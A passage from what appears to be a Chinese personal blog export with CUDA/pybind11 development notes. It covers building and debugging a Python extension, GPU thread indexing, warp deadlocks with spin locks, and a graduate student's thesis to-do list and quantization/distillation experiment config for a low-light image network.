class="line">    m.<span class="built_in">def</span>(<span class="string">&quot;print_list&quot;</span>, &amp;print_list, <span class="string">&quot;function to print list&quot;</span>, py::<span class="built_in">arg</span>(<span class="string">&quot;my_list&quot;</span>));</span><br><span class="line">    m.<span class="built_in">def</span>(<span class="string">&quot;print_list2&quot;</span>, &amp;print_list2, <span class="string">&quot;help message&quot;</span>, py::<span class="built_in">arg</span>(<span class="string">&quot;my_list2&quot;</span>));</span><br><span class="line">    m.<span class="built_in">def</span>(<span class="string">&quot;add_arrays&quot;</span>, &amp;add_arrays, <span class="string">&quot;Add two NumPy arrays&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
这里的PYBIND11_MODULE中example表示之后包的名称，编译之后的库名字也应该是这个。m.def用于表示模块中的函数有哪些。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#指定编译器</span></span><br><span class="line"><span class="comment"># CC = nvcc</span></span><br><span class="line">CC = g++</span><br><span class="line"><span class="comment">#指定编译参数</span></span><br><span class="line"><span class="comment"># CFLAGS = -shared -Xcompiler -fPIC -std=c++17 -g -D_GLIBCXX_USE_CXX11_ABI=0 </span></span><br><span class="line">CFLAGS = -shared -fPIC -std=c++17 -g -D_GLIBCXX_USE_CXX11_ABI=0 </span><br><span class="line"> </span><br><span class="line"><span class="comment">#指定头文件路径，此处用于指定非标准库的头文件路径</span></span><br><span class="line">INC = -I./ -I /home/skt1faker/anaconda3/envs/homework/include/python3.9 -I/home/skt1faker/anaconda3/envs/homework/lib/python3.9/site-packages/pybind11/include</span><br><span class="line"><span class="comment">#指定要链接的动态库或静态库 -L是指定动态库路径，非标准的动态库需要此参数</span></span><br><span class="line">LIBS =  -L/home/skt1faker/anaconda3/envs/homework/lib -lpython3.9  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#把上面放一起</span></span><br><span class="line">CXXFLAGS = <span class="variable">$&#123;CFLAGS&#125;</span> <span class="variable">$&#123;INC&#125;</span> <span class="variable">$&#123;LIBS&#125;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#指定生成可执行文件名称</span></span><br><span class="line">EXEC = example.cpython-39-x86_64-linux-gnu.so	<span class="comment"># 这个后缀是python3-config_--extension-suffix得到的</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#指定由哪些文件来生成可执行文件</span></span><br><span class="line"><span class="comment"># COBJS = mpi.cpp mpi_cuda.cu</span></span><br><span class="line">COBJS = test.cpp </span><br><span class="line"> </span><br><span class="line"><span class="comment">#make执行动作</span></span><br><span class="line">all:</span><br><span class="line">	<span class="variable">$&#123;CC&#125;</span> -o <span class="variable">$&#123;EXEC&#125;</span> <span class="variable">$&#123;COBJS&#125;</span> <span class="variable">$&#123;CXXFLAGS&#125;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#make clean动作</span></span><br><span class="line">clean:</span><br><span class="line">	<span class="built_in">rm</span> -rf <span class="variable">$&#123;OBJS&#125;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># nvcc -O3 -shared -std=c++11 -Xcompiler -fPIC `python3 -m pybind11 --includes` test.cpp -o example`python3-config --extension-suffix`</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> example <span class="keyword">as</span> e</span><br><span class="line"><span class="comment"># result = example.add(3, 4)</span></span><br><span class="line"><span class="comment"># print(result)</span></span><br><span class="line">a = np.ones(<span class="number">3</span>)</span><br><span class="line">b = np.ones(<span class="number">3</span>)</span><br><span class="line">c = e.add_arrays(a,b)</span><br><span class="line"><span class="comment"># e.add_func(1,2)</span></span><br><span class="line">list_a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">e.print_list(list_a);</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="如何查看链接库中的符号">如何查看链接库中的符号</h2>
<p>可以使用<code>nm -C 动态链接库 |grep 要查找的函数名</code>来进行查看。
## 生成的动态链接库怎么调试</p>
<p>https://www.cnblogs.com/lidabo/p/17076870.html
使用gdb可以调试，<code>gdb --args python file.py</code></p>
<p>之后在动态链接库的源文件上打断点。</p>
<p>后面的调试就和以前一样了</p>
<h2 id="cu文件如何调试">.cu文件如何调试</h2>
<p>https://zhuanlan.zhihu.com/p/386527323</p>
<p>使用cuda-gdb，可以调试.cu文件，但是在编译的时候需要加上-G选项，否则编译结束之后无法出现调试信息。</p>
<p><code>nvcc -g -G source.cpp cuda.cu -o haha</code></p>
<p>调试的时候使用命令</p>
<p><code>cuda-deb --args python test.py</code></p>
<p>下面是一些调试命令： 1. 查看cuda线程 <code>info cuda threads</code>
2. 保存断点 <code>save breakpoints b.cfg</code> 3. 切换cuda线程
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(cuda-gdb) cuda device 0 sm 1 warp 2 lane 3</span><br><span class="line">[Switching focus to CUDA kernel 1, grid 2, block (8,0,0), thread</span><br><span class="line">(67,0,0), device 0, sm 1, warp 2, lane 3]</span><br><span class="line">374 int totalThreads = gridDim.x * blockDim.x;</span><br><span class="line"></span><br><span class="line">(cuda-gdb) cuda thread (15)</span><br><span class="line">[Switching focus to CUDA kernel 1, grid 2, block (8,0,0), thread</span><br><span class="line">(15,0,0), device 0, sm 1, warp 0, lane 15]</span><br><span class="line">374 int totalThreads = gridDim.x * blockDim.x;</span><br><span class="line"></span><br><span class="line">(cuda-gdb) cuda block 1 thread 3</span><br><span class="line">[Switching focus to CUDA kernel 1, grid 2, block (1,0,0), thread (3,0,0), </span><br><span class="line">device 0, sm 3, warp 0, lane 3]</span><br><span class="line">374 int totalThreads = gridDim.x * blockDim.</span><br></pre></td></tr></table></figure></p>
<h2
id="cuda编程过程中出现内存错误时应如何排查">cuda编程过程中出现内存错误时应如何排查</h2>
<p><code>compute-sanitizer python test.py</code>
这个代码输入之后，会出现很多很多输出，这个时候就要在输出中搜索相关cuda文件的名字，来定位问题出现的位置。</p>
<h2
id="blockidxgriddimthreadidxblockdim的关系">blockIdx,gridDim,threadIdx,blockDim的关系</h2>
<p><a
href="https://blog.csdn.net/qq_43715171/article/details/121794135">参考</a></p>
<p>gridDim描述了线程格的维度情况，blockIdx描述了线程块在线程格中坐标，blockDim描述了线程块的维度情况，threadIdx描述了线程在线程块中的坐标。</p>
<p>blockDim和gridDim</p>
<p>可以把线程格和线程块都看作一个三维的矩阵。这里假设线程格是一个3<em>4</em>5的三维矩阵，
线程块是一个4<em>5</em>6的三维矩阵。</p>
<ol type="1">
<li>gridDim</li>
</ol>
<p>gridDim.x、gridDim.y、gridDim.z分别表示线程格各个维度的大小，所以有</p>
<p>gridDim.x=3 gridDim.y=4 gridDim.z=5</p>
<ol start="2" type="1">
<li>blockDim
blockDim.x、blockDim.y、blockDim.z分别表示线程块中各个维度的大小，所以有</li>
</ol>
<p>blockDim.x=4 blockDim.y=5 blockDim.z=6</p>
<ol start="3" type="1">
<li>blockIdx</li>
</ol>
<p>blockIdx.x、blockIdx.y、blockIdx.z分别表示当前线程块所处的线程格的坐标位置</p>
<ol start="4" type="1">
<li>threadIdx</li>
</ol>
<p>threadIdx.x、threadIdx.y、threadIdx.z分别表示当前线程所处的线程块的坐标位置</p>
<p>通过
blockIdx.x、blockIdx.y、blockIdx.z、threadIdx.x、threadIdx.y、threadIdx.z就可以完全定位一个线程的坐标位置了。</p>
<p>线程格里面总的线程个数N即可通过下面的公式算出</p>
<p><code>N = gridDim.x*gridDim.y*gridDim.z*blockDim.x*blockDim.y*blockDim.z</code></p>
<p>三、举例</p>
<p>将所有的线程排成一个序列，序列号为0,1,2,…,N，如何找到当前的序列号？</p>
<p>先找到当前线程位于线程格中的哪一个线程块blockId</p>
<p><code>blockId = blockIdx.x + blockIdx.y*gridDim.x + blockIdx.z*gridDim.x*gridDim.y;</code></p>
<p>找到当前线程位于线程块中的哪一个线程threadId</p>
<p><code>threadId = threadIdx.x + threadIdx.y*blockDim.x + threadIdx.z*blockDim.x*blockDim.y;</code></p>
<p>计算一个线程块中一共有多少个线程M</p>
<p><code>M = blockDim.x*blockDim.y*blockDim.z</code></p>
<p>求得当前的线程序列号idx</p>
<p><code>idx = threadId + M*blockId;</code></p>
<h2 id="什么是warp">什么是warp</h2>
<p>https://zhuanlan.zhihu.com/p/123170285</p>
<p>每一个warp含有32个线程，一个warp中的所有线程在一个block中，当一个block中的线程数量不是warp中的正数倍时，gpu会给与多余的线程分配，但是多出的线程都是inactive状态，所以block中的线程数量最好为32的倍数。</p>
<p>warp中的线程拥有<strong>同步执行规则</strong>，即同步执行一个函数，如果一个warp中的线程由锁来实现资源互斥访问的话，那必然会导致死锁的问题，因为一个线程获取了锁，其他线程没有获取，获取锁的线程会向下执行，但是warp中的线程要同步执行，所以即便是warp中一个线程获取了锁之后，其他线程没有获取锁也无法继续执行。</p>
<p>例如 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Lock</span> &#123;</span><br><span class="line">   </span><br><span class="line">    <span class="type">int</span> *mutex;</span><br><span class="line">    <span class="built_in">Lock</span>(<span class="type">void</span>) &#123;</span><br><span class="line">   </span><br><span class="line">        <span class="type">int</span> state = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">cudaMalloc</span>((<span class="type">void</span> **) &amp;mutex, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">        <span class="built_in">cudaMemcpy</span>(mutex, &amp;state, <span class="built_in">sizeof</span>(<span class="type">int</span>), cudaMemcpyHostToDevice);</span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">Lock</span>(<span class="type">void</span>) &#123;</span><br><span class="line">   </span><br><span class="line">        <span class="built_in">cudaFree</span>(mutex);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">__device__ <span class="type">void</span> <span class="title">lock</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">   </span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">atomicCAS</span>(mutex, <span class="number">0</span>, <span class="number">1</span>) != <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">__device__ <span class="type">void</span> <span class="title">unlock</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">   </span><br><span class="line">        <span class="built_in">atomicExch</span>(mutex, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">.......</span><br><span class="line"></span><br><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">theKernel</span><span class="params">(Lock myLock)</span> </span>&#123;</span><br><span class="line">   </span><br><span class="line">	myLock.<span class="built_in">lock</span>();</span><br><span class="line">	<span class="built_in">Do_your_job</span>();</span><br><span class="line">	myLock.<span class="built_in">unlock</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
在调用theKernel时，theKernel&lt;&lt;&lt;1,128&gt;&gt;&gt;(lock)会发生死锁，但是theKernel&lt;&lt;&lt;128,1&gt;&gt;&gt;(lock)就不会发生死锁
https://blog.csdn.net/Limiao_123/article/details/111197531</p>
<p>解决这种死锁的方法就是用条件语句，warp各个线程虽然是同步的，但是不同线程中根据不同的条件语句执行的也有所不同，一种比较脑瘫的方法是这样的：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__global__ void haha(int *lock,int n)&#123;</span><br><span class="line">    int id = blockIdx.x * blockDim.x + threadIdx.x;</span><br><span class="line">    if(id &gt; n)return ;</span><br><span class="line">    switch(id)&#123;</span><br><span class="line">        case 0:&#123;</span><br><span class="line">            while(atomicExch(lock,0) == 0);</span><br><span class="line">            // 进行获取锁之后的操作</span><br><span class="line">            *lock = 1;</span><br><span class="line">        &#125;break;</span><br><span class="line">        case 1:&#123;</span><br><span class="line">            while(atomicExch(lock,0) == 0);</span><br><span class="line">            // 进行获取锁之后的操作</span><br><span class="line">            *lock = 1;</span><br><span class="line">        &#125;break;</span><br><span class="line">        case 2:&#123;</span><br><span class="line">            while(atomicExch(lock,0) == 0);</span><br><span class="line">            // 进行获取锁之后的操作</span><br><span class="line">            *lock = 1;</span><br><span class="line">        &#125;break;</span><br><span class="line">        case 3:&#123;</span><br><span class="line">            while(atomicExch(lock,0) == 0);</span><br><span class="line">            // 进行获取锁之后的操作</span><br><span class="line">            *lock = 1;</span><br><span class="line">        &#125;break;</span><br><span class="line">          .</span><br><span class="line">          .</span><br><span class="line">          .</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>也就是引入分支结构就可以解决这个问题，将这个分支结构进行浅浅的改动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__global__ void haha(int *lock,int n)&#123;</span><br><span class="line">    int id = blockIdx.x * blockDim.x + threadIdx.x;</span><br><span class="line">    if(id &gt; n)return ;</span><br><span class="line">    while(ture)&#123;</span><br><span class="line">        if(atomicExch(lock,0) != 0)&#123;</span><br><span class="line">            // 进行获取锁之后的操作</span><br><span class="line">            *lock = 1;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到本文使用了自旋锁，lock = 1 表示锁被释放，lock =
0表示锁被占用。<code>atomicExch(unsigned int *address,unsigned int val)</code>表示将address处的值设置为val，并返回address处原先的值，两个操作为一个原子操作。锁的原理是先检查锁是否被占用，未被占用时获取锁。本文实现的自旋锁刚好反过来，先上锁，然后在查看原先锁的状态，如果原先锁是被释放的，那么就上锁成功。所以自旋锁的写法为
while(atomicExch(lock,0) == 0);</p>
<p>cuda中还有其他原子操作，这里给出地址。
https://blog.csdn.net/Bruce_0712/article/details/63251532</p>
<h2 id="如何设置grid与block的维度">如何设置grid与block的维度</h2>
<p>https://blog.csdn.net/yangdashi888/article/details/78183464
https://blog.csdn.net/quicmous/article/details/115250605</p>
<p>GPU 由多个 SM 处理器构成，一个 SM 处理器包含 8 个 SP 核。一个 SM
处理器可同时处理 32 个线程，实际上就是同一套指令在每个 SP 核上重复 4
次， 这样提交一次任务，8 个SP 核同时就能处理 32 个线程。
用于查看显卡中sm的数量 <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">cudaDeviceProp prop;</span><br><span class="line"><span class="built_in">cudaGetDeviceProperties</span>(&amp;prop, <span class="number">0</span>); <span class="comment">//0可以被替换成你的其他卡的实际编号</span></span><br><span class="line"><span class="type">int</span> result = prop.multiProcessorCount;  <span class="comment">// sm的数量</span></span><br></pre></td></tr></table></figure></p>
<p>sp的数量在官网上能查到</p>
<p>在设置的过程中grid中block的数量应为sm的正数倍数，这样才能使得任务均匀的分配在用于计算的sm上，block中的线程数量应为sp
* 4的整数倍。</p>
<h2
id="numpy.array和torch.tensor维度为abc对于坐标为xyz的元素其在numpy.array和torch.tensor转化为一维指针之后的对应位置如下">numpy.array和torch.tensor维度为[a,b,c],对于坐标为[x,y,z]的元素，其在numpy.array和torch.tensor转化为一维指针之后的对应位置如下：</h2>
<p>int posi = z + y * c + x * b * c;</p>
<h2
id="numpy与torch操作中python与c的api对应">numpy与torch操作中python与c++的api对应</h2>
<ol type="1">
<li><p>与torch相对应的操作
https://blog.csdn.net/weixin_45209433/article/details/103495558</p></li>
<li><p>torch.tensor中的切片操作
https://blog.csdn.net/Flag_ing/article/details/109628297</p></li>
</ol>
]]></content>
      <tags>
        <tag>cuda并行编程</tag>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>graduate</title>
    <url>/2023/10/10/graduate/</url>
    <content><![CDATA[<h2 id="abandon_the_bayer....">Abandon_the_Bayer....</h2>
<h3 id="暗光处理主要思路">暗光处理主要思路</h3>
<ol type="1">
<li><p>使用两类网络，一类用语将rggb图像变为单一颜色灰度图像，主要是为了统一输入，因为有些输入图像格式为ryyb，这种格式得到的图片质量较高</p></li>
<li><p>为了不让原始的彩色信息丢失，这里使用一个channel-wise的层，他可以接收单一颜色的灰度图片，也接受rggb颜色的图片，然后进行处理得到最终的结果
<img src="pipeline.png" /></p></li>
</ol>
<h2 id="数据集">数据集</h2>
<p>sid数据集介绍(https://blog.csdn.net/tywwwww/article/details/131072339)</p>
<h2 id="量化框架书写">量化框架书写</h2>
<ul>
<li>torch.fx使用介绍
<ul>
<li>计算图相关</li>
</ul></li>
<li>torch.nn.qat的作用
<ul>
<li>量化相关</li>
</ul></li>
<li>mqbench相关<a
href="https://mqbench.readthedocs.io/en/latest/user_guide/internal/learn_config.html">文档</a>
<ul>
<li>量化框架中层替换分别使用了pytorch中nn.qat库中的一些卷积层，以及mqbench.nn.qat、mqbench.nn.intrinsic.qat
==&gt; 主要为融合relu，batchnormal等层结构</li>
</ul></li>
<li>相关量化方法，mqbench中已经实现的部分 <a
href="https://mqbench.readthedocs.io/en/latest/get_started/support_matrix.html">内部含有相关论文</a></li>
</ul>
<h2 id="知识蒸馏">知识蒸馏</h2>
<ul>
<li>同样适用torch.fx框架书写蒸馏部分</li>
<li>完成teacher蒸馏框架 <a
href="https://zhuanlan.zhihu.com/p/353472061">特征蒸馏方案</a></li>
</ul>
<h3 id="中间层的选择">中间层的选择</h3>
<p>选择中间层进行知识蒸馏需要考虑几个因素，包括模型的架构、任务的复杂性和计算资源。以下是一些选择中间层的指导原则：</p>
<ol type="1">
<li><p>特征的重要性：首先，需要分析模型中不同层的特征表示对于任务的重要性。通常来说，越接近模型输出的层包含的特征更加抽象和高级，而越靠近输入的层包含的特征更加原始和低级。根据任务的需要，选择与任务相关性较高的中间层进行蒸馏。</p></li>
<li><p>模型大小和计算资源：蒸馏中间层会增加计算开销，因为要传递更多的特征表示。如果计算资源有限，你可能需要选择较少的中间层进行蒸馏，或者考虑对中间层进行进一步的降维或压缩。</p></li>
<li><p>蒸馏目标：确定蒸馏的目标也很重要。如果你的目标是在小型模型中保留大型模型的全部知识，那么选择更多的中间层进行蒸馏可能是有益的。如果只关注某些方面的知识，可以选择与目标知识相关的中间层。</p></li>
<li><p>实验和调整：最好的方法是进行一些实验和调整，以确定最佳的中间层选择。可以尝试不同的组合，并使用验证集来评估性能，然后选择性能最好的模型。</p></li>
</ol>
<p>总之，选择中间层需要综合考虑任务需求、计算资源和性能指标。根据你的具体情况和目标，可以灵活地调整中间层的选择来进行知识蒸馏。</p>
<h3
id="使用hession矩阵的迹去判断一个层是否需要进行蒸馏">使用hession矩阵的迹去判断一个层是否需要进行蒸馏</h3>
<ol type="1">
<li>hession能判断出一个activation的改变是否能对整个网络影响很大，对于影响很大的层我们认为这是关键输出，也就是特征比较强的层.</li>
</ol>
<h2 id="存在问题">存在问题</h2>
<ul>
<li>downshuffle中的输入没有办法量化 <img src="输入未量化.png"
alt="输入未量化" /></li>
</ul>
<h2 id="正在做的实验以及相关任务">正在做的实验以及相关任务：</h2>
<ul class="task-list">
<li><p><label><input type="checkbox"
checked="" />增加了量化方法修改的功能（不是量化开发板的修改）</label></p></li>
<li><p><label><input type="checkbox"
checked="" />修改结果保存部分的代码</label></p>
<ul class="task-list">
<li><label><input type="checkbox"
checked="" />能够完成最优结果的保存</label></li>
<li><label><input type="checkbox"
checked="" />最优结果对应的检测结果</label></li>
<li><label><input type="checkbox" checked="" />当前模型结果</label></li>
<li><label><input type="checkbox"
checked="" />当前模型保存（模型名含模型对应的袋鼠）</label></li>
<li><label><input type="checkbox"
checked="" />每代检测结果txt文件</label></li>
<li><label><input type="checkbox"
checked="" />完善量化方案配置（dsq，或者还是其他方案）</label></li>
</ul></li>
<li><p><label><input type="checkbox"
checked="" />启动对照实验</label></p>
<ul class="task-list">
<li><label><input type="checkbox"
checked="" />启动多个其他方案的量化</label>
<ul class="task-list">
<li><label><input type="checkbox" checked="" />dsq方法</label></li>
</ul></li>
<li><label><input type="checkbox"
checked="" />启动一个本方案的量化</label>
<ul class="task-list">
<li><label><input type="checkbox" checked="" />多种蒸馏权重</label></li>
<li><label><input type="checkbox" />不同位置的蒸馏层</label>
<ul class="task-list">
<li><label><input type="checkbox" checked="" />底部</label></li>
<li><label><input type="checkbox" />中部</label></li>
<li><label><input type="checkbox" />开头</label></li>
</ul></li>
<li><label><input type="checkbox" />不同位置的量化效果(不加蒸馏)</label>
<ul class="task-list">
<li><label><input type="checkbox" />开头结尾</label></li>
<li><label><input type="checkbox" />中间位置</label></li>
</ul></li>
</ul></li>
</ul></li>
<li><p><label><input type="checkbox"
checked="" />未加量化和蒸馏的代码泡一下 ## 论文章节</label></p></li>
<li><p><label><input
type="checkbox" />量化蒸馏与暗光增强的介绍</label></p>
<ul class="task-list">
<li><label><input type="checkbox" checked="" />量化</label>
<ul class="task-list">
<li><label><input type="checkbox"
checked="" />多种量化方式的数学原理</label></li>
<li><label><input type="checkbox"
checked="" />量化训练的几种方案，以及量化的难点</label></li>
<li><label><input type="checkbox" checked="" />量化如何进行训练</label>
<ul class="task-list">
<li><label><input type="checkbox"
checked="" />为什么需要统计参数</label></li>
<li><label><input type="checkbox"
checked="" />训练怎么才能达到最好的效果（展示未使用pytorch.fx量化框架加载模型的结果）</label></li>
</ul></li>
</ul></li>
<li><label><input type="checkbox" />暗光增强</label>
<ul class="task-list">
<li><label><input type="checkbox" />暗光网络</label></li>
<li><label><input type="checkbox" />暗光的难点</label></li>
</ul></li>
<li><label><input type="checkbox" />蒸馏</label>
<ul class="task-list">
<li><label><input type="checkbox" />蒸馏的介绍</label></li>
<li><label><input type="checkbox" />为什么引入蒸馏</label></li>
</ul></li>
</ul></li>
<li><p><label><input type="checkbox" />量化蒸馏框架的介绍</label></p>
<ul class="task-list">
<li><label><input type="checkbox" />量化框架的主要技术</label></li>
<li><label><input type="checkbox" />层融合原因</label>
<ul class="task-list">
<li><label><input
type="checkbox" />batchnormal、relu为什么需要需要融合</label></li>
<li><label><input
type="checkbox" />融合应该是一个什么样的计算方式</label></li>
</ul></li>
<li><label><input type="checkbox" />如何引入蒸馏</label></li>
<li><label><input type="checkbox" />量化方法的选择</label></li>
<li><label><input
type="checkbox" />框架的方便性与广泛适用性演示（可以进通过几行代码来完成量化训练的步数）</label>
<ul class="task-list">
<li><label><input type="checkbox" />量化层插入展示</label></li>
<li><label><input type="checkbox" />量化配置</label></li>
<li><label><input type="checkbox" />框架使用使用</label></li>
</ul></li>
</ul></li>
<li><p><label><input
type="checkbox" />暗光网络的量化蒸馏方案</label></p>
<ul class="task-list">
<li><label><input type="checkbox" />如何加入蒸馏，为什么要这样加</label>
<ul>
<li><label><input type="checkbox" />蒸馏层如何进行确定</label></li>
<li><label><input
type="checkbox" />activation的hession矩阵迹计算原理</label></li>
<li>[ ]</li>
</ul></li>
<li><label><input type="checkbox" />怎样实现量化</label>
<ul class="task-list">
<li><label><input
type="checkbox" />位数为什么是前面和后面有所扩大</label></li>
<li><label><input type="checkbox" />梯度反向传播方法方案</label></li>
</ul></li>
</ul></li>
<li><p><label><input type="checkbox" />实验结果展示</label></p>
<ul class="task-list">
<li><label><input type="checkbox" />对比实验结果</label></li>
</ul></li>
</ul>
<h3 id="sun-oct-15-171616-hkt-2023">Sun Oct 15 17:16:16 HKT 2023</h3>
<p><del>1. 开启两个量化 + 蒸馏的实验 ,
只有最后一层前一层的输出被蒸馏，使用了两个系数，一个是0.1，另一个是0.5（0.1的时间比较早，0.5是后放的）</del>
<del>2.
重新开始实验，发现自己的量化统计方式有些问题，没有加入训练元素（可能实际上也不需要加上训练元素，因为加载的模型早就稳定了）</del>
3.
突然发现模型中量化模型没有加载原始模型，所以效果很差，所以这里开了第三个模型</p>
<h3 id="mon-oct-16-173948-hkt-2023">Mon Oct 16 17:39:48 HKT 2023</h3>
<ol type="1">
<li>昨天起的实验没有成功（因为服务器的一些问题导致一直开在数据加载阶段），在这里加入了一些特殊层数量化的方案，将两段网络的输入和输出的都进行高位数的量化，同时将两段网络中结尾上一层的输出作为蒸馏的依据,配置如下，与以往的实验相比，效果已经好起来了。
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">quant :</span> <span class="literal">True</span></span><br><span class="line"><span class="attr">test :</span> <span class="literal">False</span></span><br><span class="line"><span class="attr">onnx :</span> <span class="literal">False</span></span><br><span class="line"><span class="attr">quant_teacher :</span> <span class="literal">True</span></span><br><span class="line"><span class="attr">gpu_id :</span> <span class="number">3</span></span><br><span class="line"><span class="attr">batch_size :</span> <span class="number">6</span></span><br><span class="line"><span class="attr">debug :</span> <span class="literal">False</span></span><br><span class="line"><span class="attr">pdb_debug :</span> <span class="literal">False</span></span><br><span class="line"><span class="attr">load_model :</span> <span class="string">./onnx/SID_weights_690000.pth</span></span><br><span class="line"><span class="attr">load_quant_model :</span> </span><br><span class="line"><span class="attr">load_teacher_model :</span> <span class="string">./onnx/SID_weights_690000.pth</span></span><br><span class="line"><span class="attr">config_file_path :</span> <span class="string">./configfile/aba_config.yaml</span></span><br><span class="line"><span class="attr">extra_quantizer_dict:</span> </span><br><span class="line">   <span class="attr">special_layer:</span> </span><br><span class="line">      <span class="attr">input_layer :</span> <span class="number">10</span></span><br><span class="line">      <span class="attr">DBF.DBF_conv1.Conv1:</span> </span><br><span class="line">         <span class="attr">weight :</span> <span class="number">10</span> <span class="string">per_channel_affine</span></span><br><span class="line">         <span class="attr">activation :</span> <span class="number">10</span> <span class="string">per_tensor_affine</span></span><br><span class="line">      <span class="attr">DBF.DBF_conv1.lrelu:</span> </span><br><span class="line">         <span class="attr">weight :</span> <span class="number">10</span> <span class="string">per_channel_affine</span></span><br><span class="line">         <span class="attr">activation :</span> <span class="number">10</span> <span class="string">per_tensor_affine</span></span><br><span class="line">      <span class="attr">DBF.DBF_conv1.Conv2:</span> </span><br><span class="line">         <span class="attr">weight :</span> <span class="number">10</span> <span class="string">per_channel_affine</span></span><br><span class="line">         <span class="attr">activation :</span> <span class="number">10</span> <span class="string">per_tensor_affine</span></span><br><span class="line">      <span class="attr">DBF.DBF_conv9.Conv2:</span> </span><br><span class="line">         <span class="attr">weight :</span> <span class="number">10</span> <span class="string">per_channel_affine</span></span><br><span class="line">         <span class="attr">activation :</span> <span class="number">10</span> <span class="string">per_tensor_affine</span></span><br><span class="line">      <span class="attr">DBF.DBF_conv9.lrelu_dup1:</span> </span><br><span class="line">         <span class="attr">weight :</span> <span class="number">10</span> <span class="string">per_channel_affine</span></span><br><span class="line">         <span class="attr">activation :</span> <span class="number">10</span> <span class="string">per_tensor_affine</span></span><br><span class="line">      <span class="attr">DBF.DBF_out:</span> </span><br><span class="line">         <span class="attr">weight :</span> <span class="number">10</span> <span class="string">per_channel_affine</span></span><br><span class="line">         <span class="attr">activation :</span> <span class="number">10</span> <span class="string">per_tensor_affine</span></span><br><span class="line">      <span class="attr">DBLE.color_conv1.Conv1:</span> </span><br><span class="line">         <span class="attr">weight :</span> <span class="number">10</span> <span class="string">per_channel_affine</span></span><br><span class="line">         <span class="attr">activation :</span> <span class="number">10</span> <span class="string">per_tensor_affine</span></span><br><span class="line">      <span class="attr">DBLE.color_conv1.lrelu:</span> </span><br><span class="line">         <span class="attr">weight :</span> <span class="number">10</span> <span class="string">per_channel_affine</span></span><br><span class="line">         <span class="attr">activation :</span> <span class="number">10</span> <span class="string">per_tensor_affine</span></span><br><span class="line">      <span class="attr">DBLE.color_conv1.Conv2:</span> </span><br><span class="line">         <span class="attr">weight :</span> <span class="number">10</span> <span class="string">per_channel_affine</span></span><br><span class="line">         <span class="attr">activation :</span> <span class="number">10</span> <span class="string">per_tensor_affine</span></span><br><span class="line">      <span class="attr">DBLE.mono_conv1.Conv1:</span> </span><br><span class="line">         <span class="attr">weight :</span> <span class="number">10</span> <span class="string">per_channel_affine</span></span><br><span class="line">         <span class="attr">activation :</span> <span class="number">10</span> <span class="string">per_tensor_affine</span></span><br><span class="line">      <span class="attr">DBLE.mono_conv1.lrelu:</span> </span><br><span class="line">         <span class="attr">weight :</span> <span class="number">10</span> <span class="string">per_channel_affine</span></span><br><span class="line">         <span class="attr">activation :</span> <span class="number">10</span> <span class="string">per_tensor_affine</span></span><br><span class="line">      <span class="attr">DBLE.mono_conv1.Conv2:</span> </span><br><span class="line">         <span class="attr">weight :</span> <span class="number">10</span> <span class="string">per_channel_affine</span></span><br><span class="line">         <span class="attr">activation :</span> <span class="number">10</span> <span class="string">per_tensor_affine</span></span><br><span class="line">      <span class="attr">DBLE.dual_conv9.Conv1:</span> </span><br><span class="line">         <span class="attr">weight :</span> <span class="number">10</span> <span class="string">per_channel_affine</span></span><br><span class="line">         <span class="attr">activation :</span> <span class="number">10</span> <span class="string">per_tensor_affine</span></span><br><span class="line">      <span class="attr">DBLE.dual_conv9.lrelu:</span> </span><br><span class="line">         <span class="attr">weight :</span> <span class="number">10</span> <span class="string">per_channel_affine</span></span><br><span class="line">         <span class="attr">activation :</span> <span class="number">10</span> <span class="string">per_tensor_affine</span></span><br><span class="line">      <span class="attr">DBLE.dual_conv9.Conv2:</span> </span><br><span class="line">         <span class="attr">weight :</span> <span class="number">10</span> <span class="string">per_channel_affine</span></span><br><span class="line">         <span class="attr">activation :</span> <span class="number">10</span> <span class="string">per_tensor_affine</span></span><br><span class="line">      <span class="attr">DBLE.dual_conv9.lrelu_dup1:</span> </span><br><span class="line">         <span class="attr">activation :</span> <span class="number">10</span> <span class="string">per_tensor_affine</span></span><br><span class="line">      <span class="attr">DBLE.DBLE_out:</span> </span><br><span class="line">         <span class="attr">weight :</span> <span class="number">10</span> <span 